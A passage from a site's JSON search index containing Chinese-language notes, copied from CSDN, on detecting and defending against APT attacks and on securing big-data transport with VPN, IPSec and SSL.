u522b\u51fa\u5176\u4e0e\u6b63\u5e38\u6d41\u91cf\u7684\u5dee\u522b\u3002 05.04 APT\u653b\u51fb\u68c0\u6d4b \u4eceAPT\u653b\u51fb\u7684\u8fc7\u7a0b\u53ef\u4ee5\u770b\u51fa\uff0c\u6574\u4e2a\u653b\u51fb\u5faa\u73af\u5305\u62ec\u4e86\u591a\u4e2a\u6b65\u9aa4\uff0c\u8fd9\u5c31\u4e3a\u68c0\u6d4b\u548c\u9632\u62a4\u63d0\u4f9b\u4e86\u591a\u4e2a\u5951\u673a\u3002\u5f53\u524dAPT\u68c0\u6d4b\u65b9\u6848\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a 05.04.01 \u6c99\u7bb1\u65b9\u6848 \u9488\u5bf9APT\u653b\u51fb\uff0c\u653b\u51fb\u8005\u5f80\u5f80\u4f7f\u7528\u4e860day\u7684\u65b9\u6cd5\uff0c\u5bfc\u81f4\u7279\u5f81\u5339\u914d\u4e0d\u80fd\u6210\u529f\uff0c\u56e0\u6b64\u9700\u8981\u91c7\u7528\u975e\u7279\u5f81\u5339\u914d\u7684\u65b9\u5f0f\u6765\u8bc6\u522b\uff0c\u667a\u80fd\u6c99\u7bb1\u6280\u672f\u5c31\u53ef\u4ee5\u7528\u6765\u8bc6\u522b0day\u653b\u51fb\u4e0e\u5f02\u5e38\u884c\u4e3a\u3002\u667a\u80fd\u6c99\u7bb1\u6280\u672f\u6700\u5927\u7684\u96be\u70b9\u5728\u4e8e\u5ba2\u6237\u7aef\u7684\u591a\u6837\u6027\uff0c\u667a\u80fd\u6c99\u7bb1\u6280\u672f\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b\u3001\u6d4f\u89c8\u7684\u7248\u672c\u3001\u6d4f\u89c8\u5668\u5b89\u88c5\u7684\u63d2\u4ef6\u7248\u672c\u90fd\u6709\u5173\u7cfb\uff0c\u5728\u67d0\u79cd\u73af\u5883\u5f53\u4e2d\u68c0\u6d4b\u4e0d\u5230\u6076\u610f\u4ee3\u7801\uff0c\u6216\u8bb8\u53e6\u5916\u4e00\u4e2a\u5c31\u80fd\u68c0\u6d4b\u5230\u3002 05.04.02 \u5f02\u5e38\u68c0\u6d4b \u5f02\u5e38\u68c0\u6d4b\u7684\u6838\u5fc3\u601d\u60f3\u662f\u6d41\u91cf\u5efa\u6a21\u8bc6\u522b\u5f02\u5e38\u3002\u5f02\u5e38\u68c0\u6d4b\u7684\u6838\u5fc3\u6280\u672f\u662f\u5143\u6570\u636e\u63d0\u53d6\u6280\u672f\u3001\u57fa\u4e8e\u8fde\u63a5\u7279\u5f81\u7684\u6076\u610f\u4ee3\u7801\u68c0\u6d4b\u89c4\u5219\uff0c\u4ee5\u53ca\u57fa\u4e8e\u884c\u4e3a\u6a21\u5f0f\u7684\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5\u3002\u5176\u4e2d\uff0c\u5143\u6570\u636e\u63d0\u53d6\u6280\u672f\u662f\u6307\u5229\u7528\u5c11\u4e86\u7684\u5143\u6570\u636e\u4fe1\u606f\uff0c\u68c0\u6d4b\u6574\u4f53\u7f51\u7edc\u6d41\u91cf\u7684\u5f02\u5e38\u3002\u57fa\u4e8e\u8fde\u63a5\u7279\u5f81\u7684\u6076\u610f\u4ee3\u7801\u68c0\u6d4b\u89c4\u5219\u662f\u68c0\u6d4b\u5df2\u77e5\u50f5\u5c38\u7f51\u7edc\u3001\u6728\u9a6c\u901a\u4fe1\u7684\u884c\u4e3a\u3002\u800c\u57fa\u4e8e\u884c\u4e3a\u6a21\u5f0f\u7684\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5\u5305\u62ec\u68c0\u6d4b\u96a7\u9053\u901a\u4fe1\u3001\u53ef\u7591\u52a0\u5bc6\u6587\u4ef6\u4f20\u8f93\u7b49\u3002 05.04.03 \u5168\u6d41\u91cf\u5ba1\u8ba1 \u5168\u6d41\u91cf\u5ba1\u8ba1\u7684\u6838\u5fc3\u601d\u60f3\u662f\u901a\u8fc7\u5bf9\u5168\u6d41\u91cf\u8fdb\u884c\u5e94\u7528\u8bc6\u522b\u548c\u8fd8\u539f\uff0c\u68c0\u6d4b\u5f02\u5e38\u884c\u4e3a\u3002\u6838\u5fc3\u6280\u672f\u5305\u62ec\u5927\u6570\u636e\u5b58\u50a8\u53ca\u5904\u7406\u3001\u5e94\u7528\u8bc6\u522b\u3001\u6587\u4ef6\u8fd8\u539f\u7b49\u3002\u5982\u679c\u505a\u5168\u6d41\u91cf\u5206\u6790\uff0c\u9762\u4e34\u7684\u95ee\u9898\u662f\u6570\u636e\u5904\u7406\u91cf\u975e\u5e38\u5927\u3002\u5168\u6d41\u91cf\u5ba1\u8ba1\u4e0e\u73b0\u6709\u7684\u68c0\u6d4b\u4ea7\u54c1\u548c\u5e73\u53f0\u76f8\u8f85\u76f8\u6210\uff0c\u4e92\u4e3a\u8865\u5145\uff0c\u6784\u6210\u5b8c\u6574\u9632\u62a4\u4f53\u7cfb\u3002\u5728\u6574\u4f53\u9632\u62a4\u4f53\u7cfb\u4e2d\uff0c\u4f20\u7edf\u68c0\u6d4b\u8bbe\u5907\u7684\u4f5c\u7528\u7c7b\u4f3c\u4e8e\"\u89e6\u53d1\u5668\"\uff0c\u68c0\u6d4b\u5230APT\u884c\u4e3a\u7684\u86db\u4e1d\u9a6c\u8ff9\uff0c\u518d\u5229\u7528\u5168\u6d41\u91cf\u4fe1\u606f\u8fdb\u884c\u56de\u6eaf\u548c\u6df1\u5ea6\u5206\u6790\uff0c\u53ef\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u516c\u53f8\u8bf4\u660e\uff0c\u5168\u6d41\u91cf\u5ba1\u8ba1+\u4f20\u7edf\u68c0\u6d4b\u6280\u672f=\u57fa\u4e8e\u8bb0\u5fc6\u7684\u68c0\u6d4b\u7cfb\u7edf\u3002 05.04.04 \u57fa\u4e8e\u6df1\u5c42\u534f\u8bae\u89e3\u6790\u7684\u5f02\u5e38\u8bc6\u522b \u57fa\u4e8e\u6df1\u5c42\u534f\u8bae\u89e3\u6790\u7684\u5f02\u5e38\u8bc6\u522b\uff0c\u53ef\u4ee5\u7ec6\u7ec6\u67e5\u770b\u5e76\u4e00\u6b65\u6b65\u53d1\u73b0\u662f\u54ea\u4e2a\u534f\u8bae\uff0c\u5982\uff1a\u4e00\u4e2a\u6570\u636e\u67e5\u8be2\uff0c\u6709\u4ec0\u4e48\u5730\u65b9\u51fa\u73b0\u4e86\u5f02\u5e38\uff0c\u76f4\u5230\u53d1\u73b0\u5f02\u5e38\u70b9\u4e3a\u6b62\u3002 05.04.05 \u653b\u51fb\u6eaf\u6e90\uff08root cause explorer\uff09 \u901a\u8fc7\u5df2\u7ecf\u63d0\u53d6\u51fa\u6765\u7684\u7f51\u7edc\u5bf9\u8c61\uff0c\u53ef\u4ee5\u91cd\u5efa\u4e00\u4e2a\u65f6\u95f4\u533a\u95f4\u5185\u53ef\u7591\u7684Web Session\u3001Email\u3001\u5bf9\u8bdd\u4fe1\u606f\u3002\u901a\u8fc7\u5c06\u8fd9\u4e9b\u4e8b\u4ef6\u81ea\u52a8\u6392\u5217\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5206\u6790\u4eba\u5458\u51ef\u82cf\u53d1\u73b0\u653b\u51fb\u6e90\u3002 \u5728APT\u653b\u51fb\u68c0\u6d4b\u4e2d\uff0c\u5b58\u5728\u7684\u95ee\u9898\u5305\u62ec\uff1a \u653b\u51fb\u8fc7\u7a0b\u5305\u62ec\u8def\u5f84\u548c\u65f6\u5e8f\uff1b \u653b\u51fb\u8fc7\u7a0b\u7684\u5927\u90e8\u5206\u8c8c\u4f3c\u6b63\u5e38\u64cd\u4f5c\uff1b \u4e0d\u662f\u6240\u6709\u7684\u5f02\u5e38\u64cd\u4f5c\u90fd\u80fd\u7acb\u5373\u88ab\u68c0\u6d4b\uff1b \u4e0d\u80fd\u4fdd\u8bc1\u88ab\u68c0\u6d4b\u5230\u7684\u5f02\u5e38\u5728APT\u8fc7\u7a0b\u4e2d\u7684\u5f00\u59cb\u6216\u65e9\u671f\u3002 \u57fa\u4e8e\u8bb0\u5f55\u7684\u68c0\u6d4b\u53ef\u4ee5\u6709\u6548\u7f13\u89e3\u4e0a\u8ff0\u95ee\u9898\u3002\u73b0\u5728\u5bf9\u6297APT\u7684\u601d\u8def\u662f\u4ee5\u65f6\u95f4\u5bf9\u6297\u65f6\u95f4\u3002\u65e2\u7136APT\u662f\u5728\u5f88\u957f\u65f6\u95f4\u53d1\u751f\u7684\uff0c\u6211\u4eec\u7684\u5bf9\u6297\u4e5f\u8981\u5728\u4e00\u4e2a\u65f6\u95f4\u7a97\u6765\u8fdb\u884c\u5bf9\u6297\uff0c\u5bf9\u957f\u65f6\u95f4\u3001\u5168\u6d41\u91cf\u6570\u636e\u8fdb\u884c\u6df1\u5ea6\u5206\u6790\u3002\u9488\u5bf9A\u95ee\u9898\uff0c\u53ef\u4ee5\u91c7\u7528\u6c99\u7bb1\u65b9\u5f0f\u3001\u5f02\u5e38\u68c0\u6d4b\u6a21\u5f0f\u6765\u89e3\u51b3\u7279\u5f81\u5339\u914d\u7684\u4e0d\u8db3\uff1b\u9488\u5bf9P\u95ee\u9898\uff0c\u53ef\u5c06\u4f20\u7edf\u57fa\u4e8e\u5b9e\u65f6\u65f6\u95f4\u70b9\u7684\u68c0\u6d4b\uff0c\u8f6c\u53d8\u4e3a\u57fa\u4e8e\u5386\u53f2\u65f6\u95f4\u7a97\u7684\u68c0\u6d4b\uff0c\u901a\u8fc7\u6d41\u91cf\u7684\u56de\u6eaf\u548c\u5173\u8054\u5206\u6790\u53d1\u73b0APT\u6a21\u5f0f\u3002\u800c\u6d41\u91cf\u5b58\u50a8\u4e0e\u73b0\u6709\u7684\u68c0\u6d4b\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u6784\u6210\u4e86\u65b0\u4e00\u4ee3\u57fa\u4e8e\u8bb0\u5fc6\u7684\u667a\u80fd\u68c0\u6d4b\u7cfb\u7edf\u3002\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u5229\u7528\u5927\u6570\u636e\u5206\u6790\u7684\u5173\u952e\u6280\u672f\u3002 05.05 APT\u653b\u51fb\u7684\u9632\u8303\u7b56\u7565 \u76ee\u524d\u7684\u9632\u5fa1\u6280\u672f\u3001\u9632\u5fa1\u4f53\u7cfb\u5f88\u96be\u6709\u6548\u5e94\u5bf9APT\u653b\u51fb\uff0c\u5bfc\u81f4\u5f88\u591a\u653b\u51fb\u76f4\u5230\u5f88\u957f\u65f6\u95f4\u540e\u624d\u88ab\u53d1\u73b0\uff0c\u751a\u81f3\u53ef\u80fd\u8fd8\u6709\u5f88\u591aAPT\u653b\u51fb\u672a\u88ab\u53d1\u73b0\u3002\u901a\u8fc7\u524d\u9762APT\u653b\u51fb\u80cc\u666f\u4ee5\u53ca\u653b\u51fb\u7279\u70b9\u3001\u653b\u51fb\u6d41\u7a0b\u7684\u5206\u6790\uff0c\u73b0\u9636\u6bb5\u9700\u8981\u4e00\u79cd\u65b0\u7684\u5b89\u5168\u601d\u7ef4\uff0c\u5373\u653e\u5f03\u4fdd\u62a4\u6240\u6709\u6570\u636e\u7684\u89c2\u5ff5\uff0c\u8f6c\u800c\u91cd\u70b9\u4fdd\u62a4\u5173\u952e\u6570\u636e\u8d44\u4ea7\uff0c\u540c\u65f6\u5728\u4f20\u7edf\u7684\u7eb5\u6df1\u9632\u5fa1\u7684\u7f51\u7edc\u5b89\u5168\u9632\u62a4\u57fa\u7840\u4e0a\uff0c\u5728\u5404\u4e2a\u53ef\u80fd\u7684\u73af\u8282\u4e0a\u90e8\u7f72\u68c0\u6d4b\u548c\u9632\u62a4\u624b\u6bb5\uff0c\u5efa\u7acb\u4e00\u79cd\u65b0\u7684\u5b89\u5168\u9632\u5fa1\u4f53\u7cfb\u3002 05.05.01 \u9632\u793e\u4f1a\u5de5\u7a0b \u6728\u9a6c\u5165\u4fb5\u3001\u793e\u4f1a\u5de5\u7a0b\u662fAPT\u653b\u51fb\u7684\u7b2c\u4e00\u4e2a\u6b65\u9aa4\uff0c\u9632\u8303\u793e\u4f1a\u5de5\u7a0b\u9700\u8981\u4e00\u5957\u7efc\u5408\u6027\u63aa\u65bd\uff0c\u65e2\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\uff0c\u5b8c\u5584\u4fe1\u606f\u5b89\u5168\u7ba1\u7406\u7b56\u7565\uff0c\u5982\uff1a\u7981\u6b62\u5458\u5de5\u5728\u4e2a\u4eba\u5fae\u535a\u4e0a\u516c\u5e03\u4e8e\u5de5\u4f5c\u76f8\u5173\u4fe1\u606f\uff0c\u7981\u6b62\u5728\u793e\u4ea4\u7f51\u7ad9\u4e0a\u516c\u5e03\u79c1\u4eba\u8eab\u4efd\u548c\u8054\u7edc\u4fe1\u606f\u7b49\uff1b\u53c8\u8981\u91c7\u7528\u65b0\u578b\u7684\u68c0\u6d4b\u6280\u672f\uff0c\u63d0\u9ad8\u8bc6\u522b\u6076\u610f\u7a0b\u5e8f\u7684\u51c6\u786e\u6027\u3002\u793e\u4f1a\u5de5\u7a0b\u662f\u5229\u7528\u4eba\u6027\u7684\u5f31\u70b9\u9488\u5bf9\u4eba\u5458\u8fdb\u884c\u7684\u6e17\u900f\u8fc7\u7a0b\u3002\u56e0\u6b64\u63d0\u9ad8\u4eba\u5458\u7684\u4fe1\u606f\u5b89\u5168\u610f\u8bc6\uff0c\u662f\u9632\u6b62\u793e\u4f1a\u653b\u51fb\u7684\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u3002\u4f20\u7edf\u7684\u529e\u6cd5\u662f\u901a\u8fc7\u5ba3\u8bb2\u57f9\u8bad\u7684\u65b9\u5f0f\u6765\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u4f46\u662f\u5f80\u5f80\u6548\u679c\u4e0d\u597d\uff0c\u4e0d\u5bb9\u6613\u5bf9\u542c\u4f17\u4ea7\u751f\u89e6\u52a8\uff1b\u800c\u6bd4\u8f83\u597d\u7684\u65b9\u6cd5\u662f\u793e\u4f1a\u5de5\u7a0b\u6d4b\u8bd5\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5df2\u7ecf\u662f\u88ab\u4e1a\u754c\u666e\u904d\u63a5\u53d7\u7684\u65b9\u5f0f\uff0c\u6709\u4e9b\u5927\u578b\u4f01\u4e1a\u90fd\u4f1a\u6388\u6743\u4e13\u4e1a\u516c\u53f8\u5b9a\u671f\u5728\u5185\u90e8\u8fdb\u884c\u6d4b\u8bd5\u3002 \u7edd\u5927\u90e8\u5206\u793e\u5de5\u653b\u51fb\u662f\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u6216\u5373\u65f6\u6d88\u606f\u8fdb\u884c\u7684\u3002\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u8bbe\u5907\u5e94\u8be5\u505a\u5230\u963b\u6b62\u5185\u90e8\u4e3b\u673a\u5bf9\u6076\u610fURL\u7684\u8bbf\u95ee\u3002\u5783\u573e\u90ae\u4ef6\u7684\u5f7b\u5e95\u68c0\u67e5\uff0c\u5bf9\u53ef\u7591\u90ae\u4ef6\u4e2dURL\u94fe\u63a5\u548c\u9644\u4ef6\u5e94\u8be5\u505a\u5230\u7ec6\u81f4\u8ba4\u771f\u7684\u68c0\u6d4b\u3002\u6709\u4e9b\u9644\u4ef6\u8868\u9762\u4e0a\u770b\u8d77\u6765\u5c31\u662f\u4e00\u4e2a\u666e\u901a\u7684\u6570\u636e\u6587\u4ef6\uff0c\u5982PDF\u6216Excel\u683c\u5f0f\u7684\u6587\u6863\u7b49\uff0c\u6076\u610f\u7a0b\u5e8f\u5d4c\u5165\u5728\u6587\u4ef6\u4e2d\uff0c\u4e14\u5229\u7528\u7684\u6f0f\u6d1e\u90fd\u662f\u672a\u7ecf\u516c\u5f00\u7684\u3002\u901a\u5e38\u4ec5\u901a\u8fc7\u7279\u5f81\u626b\u63cf\u7684\u65b9\u5f0f\uff0c\u5f80\u5f80\u4e0d\u80fd\u51c6\u786e\u8bc6\u522b\u51fa\u6765\u7684\u3002\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u662f\u6c99\u7bb1\u6a21\u62df\u771f\u5b9e\u73af\u5883\u8bbf\u95ee\u90ae\u4ef6\u4e2d\u7684URL\u6216\u6253\u5f00\u9644\u4ef6\uff0c\u89c2\u5bdf\u6c99\u7bb1\u4e3b\u673a\u7684\u884c\u4e3a\u53d8\u5316\uff0c\u53ef\u4ee5\u6709\u6548\u68c0\u6d4b\u51fa\u6076\u610f\u7a0b\u5e8f\u3002 05.05.02 \u5168\u9762\u91c7\u96c6\u884c\u4e3a\u8bb0\u5f55\uff0c\u907f\u514d\u5185\u90e8\u76d1\u63a7\u76f2\u70b9 \u5bf9IT\u7cfb\u7edf\u884c\u4e3a\u8bb0\u5f55\u7684\u6536\u96c6\u662f\u5f02\u5e38\u884c\u4e3a\u68c0\u6d4b\u7684\u57fa\u7840\u548c\u524d\u63d0\uff0c\u5927\u90e8\u5206IT\u7cfb\u7edf\u884c\u4e3a\u53ef\u4ee5\u5206\u4e3a\u4e3b\u673a\u884c\u4e3a\u548c\u7f51\u7edc\u884c\u4e3a\u4e24\u4e2a\u65b9\u9762\uff0c\u66f4\u5168\u9762\u7684\u884c\u4e3a\u91c7\u96c6\u8fd8\u5305\u62ec\u7269\u7406\u8bbf\u95ee\u884c\u4e3a\u8bb0\u5f55\u91c7\u96c6\u3002 \u4e3b\u673a\u884c\u4e3a\u91c7\u96c6\uff1a\u4e3b\u673a\u884c\u4e3a\u91c7\u96c6\u4e00\u822c\u662f\u901a\u8fc7\u5141\u8bb8\u5728\u4e3b\u673a\u4e0a\u7684\u884c\u4e3a\u76d1\u63a7\u7a0b\u5e8f\u5b8c\u6210\u3002\u6709\u4e9b\u884c\u4e3a\u8bb0\u5f55\u53ef\u4ee5\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5e26\u7684\u65e5\u5fd7\u529f\u80fd\u5b9e\u73b0\u8f93\u51fa\u3002\u4e3a\u4e86\u5b9e\u73b0\u5bf9\u8fdb\u7a0b\u884c\u4e3a\u7684\u76d1\u63a7\uff0c\u884c\u4e3a\u76d1\u63a7\u7a0b\u5e8f\u901a\u5e38\u5de5\u4f5c\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u9a71\u52a8\u5c42\uff0c\u5982\u679c\u5728\u5b9e\u73b0\u4e0a\u6709\u9519\u8bef\uff0c\u5f88\u5bb9\u6613\u5f15\u8d77\u5e95\u5c42\u5d29\u6e83\u3002\u4e3a\u4e86\u907f\u514d\u88ab\u6076\u610f\u7a0b\u5e8f\u63a2\u6d4b\u5230\u76d1\u63a7\u7a0b\u5e8f\u7684\u5b58\u5728\uff0c\u884c\u4e3a\u76d1\u63a7\u7a0b\u5e8f\u5e94\u5c3d\u91cf\u5de5\u4f5c\u5728\u9a71\u52a8\u5c42\u7684\u5e95\u90e8\uff0c\u4f46\u662f\u8d8a\u9760\u8fd1\u5e95\u90e8\uff0c\u7a33\u5b9a\u6027\u98ce\u9669\u5c31\u8d8a\u9ad8\u3002 \u7f51\u7edc\u884c\u4e3a\u91c7\u96c6\uff1a\u7f51\u7edc\u884c\u4e3a\u91c7\u96c6\u4e00\u822c\u662f\u901a\u8fc7\u955c\u50cf\u7f51\u7edc\u6d41\u91cf\uff0c\u5c06\u6d41\u91cf\u6570\u636e\u8f6c\u6362\u6210\u6d41\u91cf\u65e5\u5fd7\u3002\u4ee5Netflow\u8bb0\u5f55\u4e3a\u4ee3\u8868\u7684\u65e9\u671f\u6d41\u91cf\u65e5\u5fd7\u53ea\u5305\u542b\u7f51\u7edc\u5c42\u7684\u4fe1\u606f\u3002\u8fd1\u5e74\u6765\u7684\u5f02\u5e38\u884c\u4e3a\u5927\u90fd\u51e0\u79cd\u5728\u5e94\u7528\u5c42\uff0c\u4ec5\u51ed\u7f51\u7edc\u5c42\u7684\u4fe1\u606f\u96be\u4ee5\u5206\u6790\u51fa\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002\u5e94\u7528\u5c42\u6d41\u91cf\u65e5\u5fd7\u7684\u8f93\u51fa\uff0c\u5173\u952e\u5728\u4e8e\u5e94\u7528\u7684\u5206\u7c7b\u548c\u5efa\u6a21\u3002 05.05.03 IT\u7cfb\u7edf\u5f02\u5e38\u884c\u4e3a\u68c0\u6d4b \u4ece\u524d\u8ff0APT\u653b\u51fb\u8fc7\u7a0b\u53ef\u4ee5\u770b\u51fa\uff0c\u5f02\u5e38\u884c\u4e3a\u5305\u62ec\u5bf9\u5185\u90e8\u7f51\u7edc\u7684\u626b\u63cf\u63a2\u6d4b\u3001\u5185\u90e8\u7684\u975e\u6388\u6743\u8bbf\u95ee\u3001\u975e\u6cd5\u5916\u8054\u3002\u975e\u6cd5\u5916\u8054\uff0c\u5373\u76ee\u6807\u4e3b\u673a\u4e0e\u5916\u7f51\u7684\u901a\u4fe1\u884c\u4e3a\uff0c\u53ef\u5206\u4e3a\u4ee5\u4e0b3\u7c7b\uff1a \u4e0b\u8f7d\u6076\u610f\u7a0b\u5e8f\u5230\u76ee\u6807\u4e3b\u673a\uff0c\u8fd9\u4e9b\u4e0b\u8f7d\u884c\u4e3a\u4e0d\u4ec5\u5728\u611f\u67d3\u521d\u671f\u53d1\u751f\uff0c\u5728\u540e\u7eed\u6076\u610f\u7a0b\u5e8f\u5347\u7ea7\u65f6\u8fd8\u4f1a\u51fa\u73b0\u3002 \u76ee\u6807\u4e3b\u673a\u4e0e\u5916\u7f51\u7684C C\u670d\u52a1\u5668\u8fdb\u884c\u8054\u7edc\u3002 \u5185\u90e8\u4e3b\u673a\u5411C C\u670d\u52a1\u5668\u4f20\u9001\u6570\u636e\uff0c\u5176\u4e2d\u5916\u4f20\u6570\u636e\u7684\u884c\u4e3a\u662f\u6700\u591a\u6837\u3001\u6700\u9690\u853d\u4e5f\u662f\u6700\u7ec8\u5b9e\u8d28\u6027\u5371\u5bb3\u7684\u884c\u4e3a\u3002 \uff08\u8fdc\u7a0b\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668\uff0c\u76ee\u6807\u673a\u5668\u53ef\u4ee5\u63a5\u6536\u6765\u81ea\u670d\u52a1\u5668\u7684\u547d\u4ee4\uff0c\u4ece\u800c\u8fbe\u5230\u670d\u52a1\u5668\u63a7\u5236\u76ee\u6807\u673a\u5668\u7684\u76ee\u7684\u3002\u8be5\u65b9\u6cd5\u5e38\u7528\u4e8e\u75c5\u6bd2\u6728\u9a6c\u63a7\u5236\u88ab\u611f\u67d3\u7684\u673a\u5668\u3002\uff09","title":"\u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\uff08\u6458\u81eaCSDN\uff09"},{"location":"data_security/big_data_security_copy/#csdn","text":"\u539f\u6587\u94fe\u63a5\uff1a \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u6570\u636e\u91c7\u96c6\u5b58\u50a8\u5b89\u5168\u6280\u672f \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u6570\u636e\u6316\u6398\u5b89\u5168\u6280\u672f \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u6570\u636e\u53d1\u5e03\u5b89\u5168\u6280\u672f \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u9632\u8303APT\u653b\u51fb","title":"\u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\uff08\u6458\u81eaCSDN\uff09"},{"location":"data_security/big_data_security_copy/#01","text":"","title":"01 \u6570\u636e\u91c7\u96c6\u5b89\u5168\u6280\u672f"},{"location":"data_security/big_data_security_copy/#0101","text":"\u865a\u62df\u4e13\u7528\u7f51\u7edc\u5c06\u96a7\u9053\u6280\u672f\u3001\u534f\u8bae\u5c01\u88c5\u6280\u672f\u3001\u5bc6\u7801\u6280\u672f\u548c\u914d\u7f6e\u7ba1\u7406\u6280\u672f\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u91c7\u7528\u5b89\u5168\u901a\u9053\u6280\u672f\u5728\u6e90\u7aef\u548c\u76ee\u7684\u7aef\u5efa\u7acb\u5b89\u5168\u7684\u6570\u636e\u901a\u9053\uff0c\u901a\u8fc7\u5c06\u5f85\u4f20\u8f93\u7684\u539f\u59cb\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\u548c\u534f\u8bae\u5c01\u88c5\u5904\u7406\u540e\u518d\u5d4c\u5957\u88c5\u5165\u53e6\u4e00\u79cd\u534f\u8bae\u7684\u6570\u636e\u62a5\u6587\u4e2d\uff0c\u50cf\u666e\u901a\u6570\u636e\u62a5\u6587\u4e00\u6837\u5728\u7f51\u7edc\u4e2d\u8fdb\u884c\u4f20\u8f93\u3002\u7ecf\u8fc7\u8fd9\u6837\u7684\u5904\u7406\uff0c\u53ea\u6709\u6e90\u7aef\u548c\u76ee\u7684\u7aef\u7684\u7528\u6237\u5bf9\u901a\u9053\u4e2d\u7684\u5d4c\u5957\u4fe1\u606f\u80fd\u591f\u8fdb\u884c\u89e3\u91ca\u548c\u5904\u7406\uff0c\u800c\u5bf9\u4e8e\u5176\u4ed6\u7528\u6237\u800c\u8a00\u53ea\u662f\u65e0\u610f\u4e49\u7684\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u91c7\u7528VPN\u6280\u672f\u53ef\u4ee5\u901a\u8fc7\u5728\u6570\u636e\u8282\u70b9\u4ee5\u53ca\u7ba1\u7406\u8282\u70b9\u4e4b\u95f4\u5e03\u8bbeVPN\u7684\u65b9\u5f0f\u6ee1\u8db3\u5b89\u5168\u4f20\u8f93\u7684\u9700\u6c42\u3002 \u591a\u5e74\u6765IPSec\u534f\u8bae\u4e00\u76f4\u88ab\u8ba4\u4e3a\u662f\u6784\u5efaVPN\u6700\u597d\u7684\u9009\u62e9\uff0c\u4ece\u7406\u8bba\u4e0a\u6765\u8bb2IPSec\u534f\u8bae\u63d0\u4f9b\u4e86\u7f51\u7edc\u5c42\u4e4b\u4e0a\u6240\u6709\u534f\u8bae\u7684\u5b89\u5168\u3002\u7136\u800c\u56e0\u4e3aIPSec\u534f\u8bae\u7684\u590d\u6742\u6027\uff0c\u4f7f\u5176\u5f88\u96be\u6ee1\u8db3\u6784\u5efaVPN\u8981\u6c42\u7684\u7075\u6d3b\u6027\u548c\u53ef\u6269\u5c55\u5c5e\u6027\u3002SSL VPN\u51ed\u501f\u5176\u7b80\u5355\u3001\u7075\u6d3b\u3001\u5b89\u5168\u7684\u7279\u70b9\uff0c\u5f97\u5230\u4e86\u8fc5\u901f\u7684\u53d1\u5c55\uff0c\u5c24\u5176\u5728\u5927\u6570\u636e\u73af\u5883\u4e0b\u7684\u8fdc\u7a0b\u63a5\u5165\u8bbf\u95ee\u5e94\u7528\u65b9\u9762\uff0cSSL VPN\u5177\u6709\u5f88\u660e\u663e\u7684\u4f18\u52bf\u3002","title":"01.01 \u4f20\u8f93\u5b89\u5168"},{"location":"data_security/big_data_security_copy/#0102-ssl-vpn","text":"SSL VPN\u91c7\u7528\u6807\u51c6\u7684\u5b89\u5168\u5957\u63a5\u5c42\u534f\u8bae\uff0c\u57fa\u4e8eX.509\u8bc1\u4e66\uff0c\u652f\u6301\u591a\u79cd\u52a0\u5bc6\u7b97\u6cd5\u3002\u53ef\u4ee5\u63d0\u4f9b\u57fa\u4e8e\u5e94\u7528\u5c42\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u5177\u6709\u6570\u636e\u52a0\u5bc6\u3001\u5b8c\u6574\u6027\u68c0\u6d4b\u548c\u8ba4\u8bc1\u673a\u5236\uff0c\u800c\u4e14\u5ba2\u6237\u7aef\u65e0\u9700\u7279\u5b9a\u8f6f\u4ef6\u7684\u5b89\u88c5\uff0c\u66f4\u52a0\u5bb9\u6613\u914d\u7f6e\u548c\u7ba1\u7406\uff0c\u4ece\u800c\u964d\u4f4e\u7528\u6237\u7684\u603b\u6210\u672c\u5e76\u589e\u52a0\u8fdc\u7a0b\u7528\u6237\u7684\u5de5\u4f5c\u6548\u7387\u3002 SSL\u534f\u8bae\u662fNctscape\u516c\u53f81995\u5e74\u63a8\u51fa\u7684\u4e00\u79cd\u5b89\u5168\u901a\u4fe1\u534f\u8bae\u3002SSL\u534f\u8bae\u5efa\u7acb\u5728\u53ef\u9760\u7684TCP\u4f20\u8f93\u534f\u8bae\u4e4b\u4e0a\uff0c\u5e76\u4e14\u4e0e\u4e0a\u5c42\u534f\u8bae\u65e0\u5173\uff0c\u5404\u79cd\u5e94\u7528\u5c42\u534f\u8bae\uff08\u5982\uff1aHTTP/FTP/TELNET\u7b49\uff09\u80fd\u901a\u8fc7SSL\u534f\u8bae\u8fdb\u884c\u900f\u660e\u4f20\u8f93\u3002 SSL\u534f\u8bae\u63d0\u4f9b\u7684\u5b89\u5168\u8fde\u63a5\u5177\u6709\u4ee5\u4e0b3\u4e2a\u57fa\u672c\u7279\u70b9\uff1a 